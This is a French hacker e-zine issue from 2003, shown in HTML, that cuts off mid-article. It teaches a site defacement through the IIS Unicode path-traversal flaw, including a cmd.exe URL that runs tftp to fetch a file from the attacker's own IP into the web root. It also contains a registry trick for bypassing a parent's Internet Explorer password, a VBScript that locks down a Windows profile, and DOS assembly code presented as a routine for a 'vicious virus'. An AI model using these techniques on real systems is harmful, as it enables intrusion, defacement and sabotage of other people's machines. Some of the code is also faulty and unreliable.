<HTML>
<HEAD>
<STYLE>INPUT {
	BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-WEIGHT: normal; FONT-SIZE: 11px; BORDER-LEFT: #000000 1px solid; COLOR: #000000; BORDER-BOTTOM: #000000 1px solid; FONT-FAMILY: verdana; BACKGROUND-COLOR: #FFFFFF
}
.text {
	FONT-WEIGHT: normal; FONT-SIZE: 11px; COLOR: #a9bfc7; FONT-FAMILY: verdana
}
TEXTAREA {
	BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-WEIGHT: normal; FONT-SIZE: 11px; BORDER-LEFT: #000000 1px solid; COLOR: #000000; BORDER-BOTTOM: #000000 1px solid; FONT-FAMILY: verdana; BACKGROUND-COLOR: #FFFFFF
}
A:link {
	COLOR: #a9bfc7; TEXT-DECORATION: none
}
A:hover {
	COLOR: #e9ffff; TEXT-DECORATION: none
}
A:visited {
	TEXT-DECORATION: none
}
</STYLE>
<TITLE>TDC Mag N&deg;1</TITLE> <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1"> 
</HEAD>

<BODY BGCOLOR="#43575f" TEXT="#CCCCCC" LINK="#a9bfc7" VLINK="#a9bfc7" ALINK="#a9bfc7">
<DIV ALIGN="CENTER"><P><A HREF="http://dealerhacksecurity.free.fr"><IMG SRC="TDC%20files/DHS-bannier.gif" WIDTH="522" HEIGHT="91" BORDER="0"></A></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><B>TDC 
- The Darkunderground Clan</B></FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">************************************************************* 
<BR>\\\\\\\\\\\\\\\\\\\\\\\\ooooooooo:::::<FONT COLOR="#FF0000">DHS</FONT><FONT COLOR="#FF0000"> 
&amp; TDC Mag' N&deg;1</FONT>:::::<FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">ooooo</FONT>oooo//////////////////////</FONT></P></DIV><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Ecrit 
le 22/01/2003 </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">EDIT&Ocirc;T 
: </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><B>B</B>eaucoup 
d'entre vous connaisse <FONT COLOR="#FF0000"><I>Dealer-Hack</I></FONT> et <FONT COLOR="#FF0000"><I>DHS 
- Dealer Hack Security</I></FONT> , les sites de la TDC The DarkundergrounD Clan 
Team .</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Mais 
pourquoi faire un e-zine ?? Encore un ?? Bourr&eacute; de truc trop nul du style 
&quot;comment faire une bombe&quot;, &quot;comment mailbomber mon pote ou crasher 
son poste?&quot;??! ) <BR>Pas du tout! Ce magazine a une ambition plus noble et 
s&eacute;rieuse. S'adressant &agrave; tous les newbie de part le monde entier 
<BR>( enfin, n'exag&eacute;rons rien... pour l'instant, juste le monde fran&ccedil;ais 
:p , il sera orient&eacute;, s&eacute;curit&eacute; informatique, <BR>programmation, 
hacking, cracking et TV-Sat... Bref, la m&ecirc;me th&eacute;matique que les sites 
et forums de nos sites <BR>( <A HREF="http://membres.lycos.fr/darkunderground/Forum/index.php" TARGET="_blank">http://membres.lycos.fr/darkunderground/Forum/index.php</A> 
) et ( <A HREF="http://dealerhacksecurity.free.fr/forum/index.php" TARGET="_blank">http://dealerhacksecurity.free.fr/forum/index.php</A> 
) .<BR>TDC (The Darkunderground Clan) est un groupe de hacker qui n'est pas l&agrave; 
pour pirater, d&eacute;facer de sites, encore moins <BR>pour monter un groupe 
clandetsins de warez et surtout pas pour faire du cracking ill&eacute;gal &agrave; 
la cha&icirc;ne! ( j'esp&egrave;re que <BR>les lamerz et les script-kiddies auront 
compris que ce Mag n'est d&eacute;finitivement pas fait pour eux...). Nous sommes 
l&agrave; <BR>pour am&eacute;liorer la communaut&eacute; hacker fran&ccedil;aise 
et autres, pour faire progresser la s&eacute;curit&eacute; du web. &quot;Nous 
sommes tous <BR>les m&ecirc;mes&quot; disaient The Mentor. Pas de disinctions 
raciales, on reste politiquement neutre, sans aucun pr&eacute;jug&eacute;s envers 
<BR>qui que ce soit, ni de distinctions religieuses. Seulement unis pour partager 
la Connaissance, c'est notre Graal! </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Non, 
ce n'est pas un simple d&eacute;lire d'adolescent &agrave; la fleur de l'&acirc;ge 
en manque de gloire... mais bien plus! La soif <BR>de connaissance, de partage, 
d'int&eacute;r&ecirc;t! La solidarit&eacute;! Voil&agrave; le but de Dealer-Hack 
Magazine. <BR>Soutenu et r&eacute;alis&eacute; par une &eacute;quipe grandissante, 
n'h&eacute;sitez pas &agrave; participez &agrave; ce magazine qui sera des plus 
ouverts. <BR>Modeste d&eacute;but, mais c'est aussi &agrave; vous de collaborer 
(note de stigmata : SVP!!! Laissez nous pas dans la bouze, les mecs!!!). <BR>Si 
vous avez des articles &agrave; nous envoyer-insultes-prix pultizer-pots-de-vin 
(expression copyrith&eacute;e par Neuralien mouahaha )))... contactez stigmata 
: <A HREF="mailto:se7en-up@caramail.com">se7en-up@caramail.com</A></FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR></FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">**************************<B><FONT COLOR="#CCCCCC">Contacts</FONT></B>************************** 
<BR>R&eacute;alisateur : <FONT COLOR="#FF0000">A-bone</FONT> =&gt; <A HREF="mailto:alex.bone@caramail.com">alex.bone@caramail.com</A> 
<BR>Concepteur : <FONT COLOR="#FF0000">Stigmata</FONT> =&gt; <A HREF="mailto:se7en-up@caramail.com">se7en-up@caramail.com</A> 
<BR>***********************************************************</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">///////////////////////////////////////////////////////////////////////////////////////////////// 
<BR>SOMMAIRE PROVISOIRE DU 1er NUMERO <BR>///////////////////////////////////////////////////////////////////////////////////////////////// 
</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2" COLOR="#CCCCCC">1 
-</FONT><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> INTRODUCTION 
: BUT, OBJECTIF, HISTOIRE .<BR><FONT COLOR="#CCCCCC">2 -</FONT> SECURITE : PROTEGER 
SON PC . <BR><FONT COLOR="#CCCCCC">4 -</FONT> HACKING : COMMENT DEFFACER UN SITE 
GRACE A LA FAILLE UNICODE ( EXPLOIT TESTER )<BR><FONT COLOR="#CCCCCC">3 -</FONT> 
CRACKING : INTRO . </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>///////////////////////////////////////////////////////////////////////////////////////////////// 
<BR>///////////////////////////////////////////////////////////////////////////////////////////////// 
<BR>///////////////////////////////////////////////////////////////////////////////////////////////// 
</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>1. INTRODUCTION <BR>===================================================================== 
</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">La plus 
gros de notre oeuvre a &eacute;t&eacute; &eacute;nonc&eacute; dans l'&eacute;dito. 
Notre groupe est ici avant tout pour vous, notre site existe <BR>depuis un petit 
bout de temps etest d&eacute;j&agrave; fort connu! Avant tout, d&eacute;finissions 
le terme de &quot;hacker&quot;. Un hacker est un <BR>bidouilleur informatique 
dans sons sens le plus strict (on va pas non plus se faire un cours complet d'&eacute;thymologie). 
<BR>A partir de l&agrave;, le gtype qui bidouille son OS, paum&eacute; dans son 
bled, coup&eacute; du monde, est un hacker. Le but d'un hacker <BR>c'est sa soif 
d'apprendre, de conna&icirc;tre le <FONT COLOR="#FF0000">rouge</FONT> interne 
d'un principe, son fonctionnement le plus profond. Ce n'est <BR>pas un m&eacute;tier 
ou un passe-temps, mais un mode de vie, une phylosophie compl&egrave;te. A partir 
de l&agrave;, ses actions le classeront <BR>soit dans les crackers (voire les 
crashers, des crackers extr&eacute;mistes), soit dans les hacker, o&ugrave; on 
distinguera white hat <BR>et black hat. Mais nous ne nous classeront pas d&eacute;finitvement 
dans &quot;black&quot; ou &quot;white&quot; hat. Securityfocus et ceux qui l'ont<BR> 
fond&eacute;, &eacute;taient des white hat!! Mais ils ont &eacute;t&eacute; vendus 
au busisness... DAMNED! ce monde nous corrompt jusuq'&agrave; notre &eacute;tat 
<BR>d'esprit...! Toutefois, on est pas la pour se venger de ces white aht &quot;d&eacute;chus&quot;. 
Ils font leur vie, on fait la notre .<BR> <BR>Bon, voil&agrave; pour la d&eacute;finition 
des termes. au fur et &agrave; mesure que les premiers num&eacute;ros sortiront, 
le magazine se structurera<BR> en des rubriques bien d&eacute;finies, ce sommaire 
actuel &eacute;tant totalement provisoire... et cela d&eacute;pend de vous!!! 
Si vous avez <BR>des articles &agrave; nous envoyer, on est pr&ecirc;ts &agrave; 
les faire para&icirc;tre, du moment qu'il reste dans notre &eacute;tat d'esprit 
et garde un <BR>niveau acceptable! <BR>Ce premier num&eacute;ro gardera un niveau 
vague et simple, afin d'int&eacute;ress&eacute; tout le monde! A chaque num&eacute;ro 
le niveau montera <BR>d'un cran avec quelques articles d'&eacute;lites! Comme 
nous avions voulu a tout prix commencer notre magazine en ce d&eacute;but <BR>d'ann&eacute;e 
et qu'il s'est produit des bouleversement dans l'actualit&eacute; informatique 
ses derniers temps <BR>(voir la rubrique FAILLE!) </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Alors, 
sur ce... Let's go! </FONT></P><P></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>2 . SECURITE <BR>===================================================================== 
</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">notre 
mission sera de prot&eacute;ger une machine X contre un piratage directe (c'est-&agrave;-dire, 
pas par internet, pour se prot&eacute;ger tout simple, d&eacute;connecter votre 
modem ;)</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">I. 
COMMENT PROTEGER SON PC ?<BR>------------<BR> Voici ce qui s'appelle une petite 
synth&egrave;se de toutes les connaissances &eacute;l&eacute;mentaires de Windows. 
L'objectif sera de bloquer l'acc&egrave;s &agrave; notre PC afin d'emp&ecirc;cher 
qui que ce soit &agrave; le toucher s'il n'est pas autoris&eacute;. d&eacute;j&agrave;, 
sachez que Windows est une v&eacute;ritable passoire en mati&egrave;re de s&eacute;curit&eacute; 
informatique et encore, on est gentil (et poli surtout) Donc, essayons de rendre 
cette protection plus cons&eacute;quente tout en utilisant notre faible moyens.<BR> 
D&eacute;j&agrave;, on va dans le Panneau de Configuration, Utilisateurs et on 
cr&eacute;e un profil , par ex &quot;paul&quot;. on red&eacute;marre et, ouais! 
il demande un passwd pour entrer. N'ayez crainte, les programmeurs de Microsoft 
ne connaissent pas la s&eacute;curit&eacute;. il suffit, en effet, de cliquer 
sur Annuler, pour acc&egrave;der &agrave; la machine :)) Alors, on va am&eacute;liorer 
tout ca. retournons dans PAnneau de configuration/Utilisateurs et cr&eacute;ons 
un deuxi&egrave;me profil, &quot;tarlouse&quot;. Maintenant on reboote et si on 
fait Annuler, on tombe sur le profil &quot;bouffon&quot;. or, il est impossible 
de passer du profil &quot;bouffon&quot; au profil &quot;paul&quot; comme &ccedil;a. 
la solution est donc l&agrave;, il suffit de bloquer le profil &quot;bouffon&quot; 
afin que le pirate soit pi&eacute;g&eacute;. pour cela, on a deux moyens : soit 
on r&eacute;alise une attaque brute et on paralyse l'interface Windows de ce profil, 
soit on y va plus soft et on neutralise intelligemment le profil. Comme le but 
de la rubrique c'est quand meme d'apprendre la programmation, on va faire les 
deux.<BR> Alors, commen&ccedil;ons par la m&eacute;thode la plus simple et la 
plus courte, la m&eacute;thode soft. R&eacute;fl&eacute;chissons:le type d&eacute;marre 
la machine et il tombe devant un menu multi-utilisateurs. Comme il ne conna&icirc;t 
pas le mot de passe de &quot;Paul&quot;, il va aller sur &quot;bouffon&quot; ou 
bien faire Annuler, ce qui reviendra strictement &agrave; la meme chose. comme 
il peu explorer la machine dans le profil &quot;bouffon&quot;, notre but va &ecirc;tre 
de l'&eacute;jecter de ce profil avant qu'il n'est plus faire quoi que ce soit. 
Voil&agrave; la solution : il suffit de cr&eacute;er un fichier qui reboote la 
machine et de le mettre au d&eacute;marrage du profil ; quand le pirate le d&eacute;marrera 
il sera exit : le PC va red&eacute;marrer :) pas mal comme astuce, non ? bon , 
c'est pas grave. alors, pour faire &ccedil;a, tout simple : cr&eacute;ez un file 
&quot;restart.bat&quot; (vous pouvez changer le nom mais gardez l'extension batch) 
dans le repertoire dirwin\Menu d&eacute;marrer\D&eacute;marrages (ou dirwin est 
l'adresse de votre dossier windows). dedans ecrivez:</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">@echo 
off<BR>exit</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Allez 
dans Propri&eacute;t&eacute;s du menu contextuel du fichier (cliquez dessus du 
gauche droit de la souris si vous pr&eacute;f&eacute;rez...) et cochez l'option 
&quot;Fermez en quittant&quot; dans l'onglet Programmes. Dans &quot;Param&egrave;tres 
avanc&eacute;es&quot;, d&eacute;cochez la case &quot;Avertir avant de passer en 
mode MS-DOS&quot;. Ou alors, si vous ne voulez aps que le PC red&eacute;marre, 
mais l'&eacute;teindre, allez dans D&eacute;marrez/Param&egrave;tres/Barre des 
t&acirc;ches et menu d&eacute;marrer, et sur l'onglet Programmes du Menu D&eacute;marrez. 
L&agrave;, cliquez sur &quot;Ajouter...&quot;. en guise de ligne de commande, 
tapez c:\Windows\Rundll32.exe user.exeExitWindows. le PC red&eacute;marrera si 
vous cliquez sur l'ic&ocirc;ne. faites la meme manip pour la alncer au d&eacute;marrage 
du profil.<BR> Et voil&agrave; pour la m&eacute;thode soft. elle est sympa, elle 
est classe, elle est simple et radicale. Or, notre but &eacute;tant d'apprendre, 
de d&eacute;couvrir, de chercher et d'exp&eacute;rimenter, testons la deuxi&egrave;me 
technique dite &quot;le-coup-du-bourrin&quot;. Elle est de loin l&agrave; plus 
directe et meme 'sadique' car elle d&eacute;truit dans le profil par d&eacute;faut, 
en l'occurrence &quot;bouffon&quot;, tout possibilit&eacute; de piratage en paralysant 
l'interface Windows compl&egrave;tement. Ici, on va jouer sur la base de registre. 
cette denri&egrave;re &eacute;tant accessible par l'autre profil, en cas de fausse 
manip, on peut corriger la gaffe apr le profil &quot;paul&quot; tranquillement. 
on verra &ccedil;a. d'abord, je vous balance le code, et ensuite on explique tout 
&ccedil;a. donc, toujours avec le language VBScript, cr&eacute;ez un file .vbs 
et mettez-y :<BR>Dim WSHShell<BR>Set WSHShell = Wscript.CreateObject(&quot;Wscript.Shell&quot;)<BR>WSHShell.RegWrite 
&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun&quot;,1,&quot;REG_DWORD&quot;<BR>WSHShell.RegWrite 
&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\ClearRecentDocsOnExit&quot;,1,&quot;REG_BINARY&quot;<BR>WSHShell.RegWrite 
&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose&quot;,1,&quot;REG_DWORD&quot;<BR>WSHShell.RegWrite 
&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop&quot;,1,&quot;REG_DWORD&quot;<BR>WSHShell.RegWrite 
&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNetHood&quot;,1,&quot;REG_DWORD&quot;<BR>WSHShell.RegWrite 
&quot;HKCUR\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskbar&quot;,1,&quot;REG_DWORD&quot;<BR>WSHShell.RegWrite 
&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoEntireNetwork&quot;,1,&quot;REG_DWORD&quot;<BR>WSHShell.RegWrite 
&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu&quot;,1,&quot;REG_DWORD&quot;<BR>WSHShell.RegWrite 
&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives&quot;,1,&quot;REG_DWORD&quot;<BR>WSHShell.RegWrite 
&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSaveSettings&quot;,1,&quot;REG_DWORD&quot;<BR>WSHShell.RegWrite 
&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFavoritesMenu&quot;,1,&quot;REG_DWORD&quot;<BR>WSHShell.RegWrite 
&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind&quot;,1,&quot;REG_DWORD&quot;<BR>WSHShell.RegWrite 
&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuSubFolder&quot;,1,&quot;REG_DWORD&quot;<BR>WSHShell.RegWrite 
&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu&quot;,1,&quot;REG_DWORD&quot;<BR>WSHShell.RegWrite 
&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFavoritesMenu&quot;,1,&quot;REG_DWORD&quot;</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">bon 
l&agrave;, j'ai essay&eacute; de vous mettre le plus de commande possible, meme 
si elle ne serve pas vraiment ici, afin que vous les connaissez et pouvez les 
utilis&eacute; dans d'autres buts. Au dessus il ny sont pas tous. En dessous, 
si.<BR>voici a koi correspondent les commandes.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">NoClose 
= + de bouton arr&ecirc;ter<BR>NoRun = + de bouton executer<BR>NoDesktop = + d'ic&ocirc;nes<BR>NoNetHood 
= + de voisinages r&eacute;seau, l'ordi est isol&eacute; du r&eacute;seau<BR>NoSetTaskbar 
= el&egrave;ve la commande Barre des t&acirc;ches ds D&eacute;marrer/Param&egrave;tres<BR>NoFavoritesMenu 
= + de favoris (!valeur binaire!)<BR>ClearRecentDocsOnExit = + de documents.<BR>NoSetFolders 
= Enl&egrave;ve la commande Panneau de configuration et imprimantes dans D&eacute;marrer/Param&egrave;tres<BR>NoEntireNetwork= 
cacher le r&eacute;seau global<BR>NoFileMenu= cache le menu fichier de l'Explorateur 
Windows<BR>NoDrives= + d'acc&egrave;s au disques. voici els correspondances des 
disques : A=1 B=2 C=3... si vous voulez bloquer le disque A et C, tapez 4 etc. 
si cette valeur vaut 255 (en d&eacute;cimal) tous les lecteurs sont masqu&eacute;s.<BR>NoChangeStartMenu 
= tout est dans le nom :)<BR>NoFind = d&eacute;sactive le raccourci de Recherche.<BR>NoFolderOptions 
= pas d'options de dossier!<BR>NoViewContextMenu = + de menu contextuel<BR>NoTrayContextMenu 
= impossibilit&eacute; de modifier le menu contextuel<BR>NoAddPrinter = impossibilit&eacute; 
d'ajouter des imprimantes<BR>NoStartBanner = + de msg de d&eacute;part ds la barre 
des t&acirc;ches (&quot;Cliquez ici pour commencer&quot;)<BR>NoDeletePrinter = 
Toutes les imprimantes install&eacute;es ne peuvent &ecirc;tre supprim&eacute;es<BR>NoSaveSetting 
= les param&egrave;tres du bureau et des ic&ocirc;nes ne sont pas nregistr&eacute;s 
en quittant.<BR>NoStartMenuSubFolder = les ss-dossiers du menu D&eacute;marrer 
deviennent inactifs.<BR>NoPrinterTabs = l'onglet &quot;D&eacute;tail&quot; et 
&quot;G&eacute;n&eacute;ral&quot; de &quot;Imprimantes&quot; sont masqu&eacute;s<BR>DisableRegistryTools 
= d&eacute;sactivation de regedit (&eacute;diteur de Base de Registre)<BR>NoRecentDocsHistory 
= Pour IE4.0, Documents disparait du menu D&eacute;marrer.<BR>NoInternetIcon = 
effacement de l'ic&ocirc;ne Internet Explorer du bureau.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">et 
voil&agrave;! blocage total de l'interface de Windows... le pirate peut changer 
de boulot et aller planter des chous, paske la, vous le cassez en deux ;)<BR>la 
prochaine fois, on verra comment restreindre certaines fonctionnalit&eacute;s 
dans Windows, afin d'emp&ecirc;cher un utilisateur indiscret de modifier certains 
param&egrave;tres sensible tout en lui laissant la possibilit&eacute; d'acc&eacute;der 
a la machine.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>V. 
UN PTIT TRUCK<BR>------------<BR> Vous savez comment faire sauter le passwd sous 
Internet explorer 4.x et meme 5.x (je crois bien, si je ne mabuze). par exemple, 
si votre p&egrave;re mais un apsswd pour vous emp&ecirc;cher d'utiliser internet, 
eh bien, cliquez sur D&eacute;marrez/Ex&eacute;cuter et tapez regedit pour rentrez 
dans la base de Registre. ensuite, allez dans HKey_Local_Machine\Software\Microsoft\Windows\CurrentVersion\Policies\Ratings. 
Virez le cl&eacute; &quot;Key&quot;. D&eacute;sormais, y a plus de passwd.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>VI. 
UN PROG<BR>------------<BR>voici un prog qui permet de rebooter la machine d&egrave;s 
qu'on presse 5 touches. c une bonne routine pour un virus particuli&egrave;rement 
vicieux.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">***<BR>.model 
tiny <BR>.code <BR>org 100h <BR>INSTALL: <BR>MOV AX,3509h <BR>INT 21h <BR>MOV 
[BXREG],BX <BR>MOV [ESREG],ES <BR>MOV AH,25h <BR>MOV DX,offset NEW_INT <BR>INT 
21h <BR>MOV DX,offset EOP <BR>INT 27h <BR>NEW_INT: PUSHF <BR>INC WORD PTR CS:[COUNTER] 
<BR>CMP WORD PTR CS:[COUNTER],20 <BR>JB NOCOUNTER <BR>PUSH AX <BR>PUSH BX <BR>PUSH 
CX <BR>PUSH DX <BR>PUSH ES <BR>PUSH DS <BR>PUSH SS <BR>PUSH SI <BR>PUSH DI <BR>JMP 
SKIP <BR>NOCOUNTER: JMP ADIOS <BR>SKIP: <BR>CALL REBOOT <BR>MOV WORD PTR CS:[COUNTER],0 
<BR>POP DI <BR>POP SI <BR>POP SS <BR>POP DS <BR>POP ES <BR>POP CX <BR>POP BX <BR>POP 
AX <BR>ADIOS: <BR>POPF </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">DB 
0EAh <BR>BXREG dw ? <BR>ESREG dw ? <BR> <BR>COUNTER dw 0 <BR> <BR>REBOOT: MOV 
AH,2 <BR>XOR BH,BH <BR>XOR DX,DX <BR>INT 10h <BR>MOV AH,9 <BR>MOV CX,2000 <BR>MOV 
AL,' ' <BR>MOV BL,7 <BR>INT 10h <BR>JMP FAR 0FFFFh:0 <BR>EOP: <BR>END START <BR>***</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>3 . <U><FONT COLOR="#c0c0c0" FACE="Arial, Helvetica, sans-serif">La faille 
Unicode IIS</FONT></U> et son exploit .<BR>=====================================================================</FONT></P><P ALIGN=LEFT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">Je 
commence par dire que cette faille est d'une simplicité incroyable !!!<BR>Pour 
pénétrer un serveur, il faut rajouter qq lignes de codes après l'URL !<BR>Cette 
faille fait le bonheur des <FONT COLOR="#0000FF">script kiddies</FONT> !</FONT></P><P ALIGN=LEFT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">cette 
faille peut etre exploiter par deux fa&ccedil;on , la premier c'est la methode 
de TFTP que j'ai pris sur le site d'immortale hack et la deuxieme fa&ccedil;on 
c'est celle que j'explique moi meme et que j'ai deja essayer avec plusieurs serveur 
et qui marche parfaitement ( si le serveur concerner n'est pas patcher contre 
cette vuln&eacute;rabilit&eacute; biensur ) </FONT></P><P ALIGN=LEFT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">PS 
: je prepose au webmaster des sites heberger sur un seveur IIS 4/5 des patches 
a la fin de l'article .</FONT></P><P ALIGN=LEFT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000"><B>Ok 
let's go et on commence par l'expliquation des gars d'immortal hack :</B></FONT></P><P ALIGN=LEFT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">Il 
y a beaucoup de serveur dans le monde qui utilisent IIS (le srv de MiCrO$oFt). 
Ce serveur web, comme tout,<BR>présente une faille. Cette faille permet de faire 
un dir du DD du srv ! Et pas seulement<BR>un dir !! on peut supprimer, renommer, 
uploader,...tout koi !</FONT></P><P ALIGN=LEFT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">Cette 
faille, vous l'aurez bien compris ne s'applique que sur les serveurs de type NT4.0 
et IIS4.0,5.0</FONT></P><P ALIGN=LEFT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">Cette 
faille est dû a un mal fonctionnement au niveau de l'URL<BR>car par défaut, IIS 
inspecte l'url et regarde si il y a un ou des ..\.. dedans.<BR>Et s'il en trouve, 
c'est qq1 essaye de pénétrer dans le DD ! et biensur, cela n'est pas<BR>permis 
par IIS mais si on change le /ou\ par sa valeur en unicode, IIS n'y voit que dale 
! Ex :<BR>Vous savez, quand il y a un espace dans l'url, IE et les autres le remplacent 
par sa valeur en Unicode<BR>Qui est en l'occurrence %20 ! Donc pour pénétrer le 
srv, y a + ka duper IIS par la valeur du caractère ASCII en<BR>sa valeur Unicode 
! Pas + compliqué que ça !</FONT></P><P ALIGN=LEFT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif" COLOR="#FFFFFF">Exemple 
d'intrusion :</FONT></P><P ALIGN=LEFT>&nbsp;</P><P ALIGN=LEFT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Dans 
cette exemple d'intrusions, j'ai "attaqué" MON serveur tournant sous IIS ! C pkoi 
je vous recommande fortement<BR>de ne pas utiliser la faille Unicode sur des serveurs 
ne vous appartenant pas ! Sous peine d'etre hors la loi</FONT></P><P ALIGN=center>&nbsp;</P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><U><B>I. 
Test pour savoir si la faille Unicode est présente</B></U></FONT></P><P ALIGN=left>&nbsp;</P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Il 
y a plusieurs méthodes pour savoir si un IIS (ou un NT) est vulnérable a la faille 
Unicode</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">1. 
Le scanner : Vous indiquez l'ip a un scanneur dont on en trouve si bien sur le 
web et le scanneur fera le boulot pour vous !</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">2. 
A la main : Vous trouvez un srv NT ou IIS (par des méthodes de OsFingerPrint ou 
autres) et vous testez toutes les syntaxes recensées !</FONT></P><P ALIGN=left>&nbsp;</P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><U><B>2. 
Attaque du serveur :</B></U></FONT></P><P ALIGN=left>&nbsp;</P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Une 
fois la syntaxe découverte, vous pouvez acceder au programme cmd.exe ki permet 
d'éxécuter toutes les commandes MS-DOS</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><IMG BORDER=0 HEIGHT=636 
SRC="La%20faille%20Unicode%20IIS/1.jpg" WIDTH=627></FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Le 
répertoire du site est par défaut : <B>C:\IntePub\wwwroot<BR></B>Il se peut aussi 
que le SysOp (System Operator = l'administrateur du système) aille fait des alias 
ki lui permet de définir le rep qu'il souhaite</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><IMG BORDER=0 HEIGHT=508 
SRC="La%20faille%20Unicode%20IIS/7.jpg" WIDTH=626></FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Maintenant 
on veut uploader sur la machine pour mettre notre page : Hacked by ...</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Pour 
uploader, on peut soit utiliser SolarWinds TFTP ou bien on écrit les commandes 
ftp dans un txt sur la machine attaqué après on éxécute ce txt</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><B>Upload 
via le srv FTFP de SolarWinds</B></FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Fo 
le télécharge en premier ! ;) Sur le site de l'éditeur : <A 
HREF="http://www.solarwinds.net/"><FONT COLOR="#00CC33">www.solarwinds.net</FONT></A></FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Une 
fois téléchargé, installé et éxécuter, vous devez utilisez cette syntaxe pour 
uploader :</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">http://<FONT COLOR=#ff0000>ipdusrv</FONT>/<FONT 
COLOR=#ff0000>syntaxe</FONT>/winnt/system32/cmd.exe?/c+tftp.exe+"-i"+<FONT 
COLOR=#ff0000>VOTREIP</FONT>+GET+index.hm+c:\Interpub\wwwroot</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><IMG BORDER=0 HEIGHT=213 
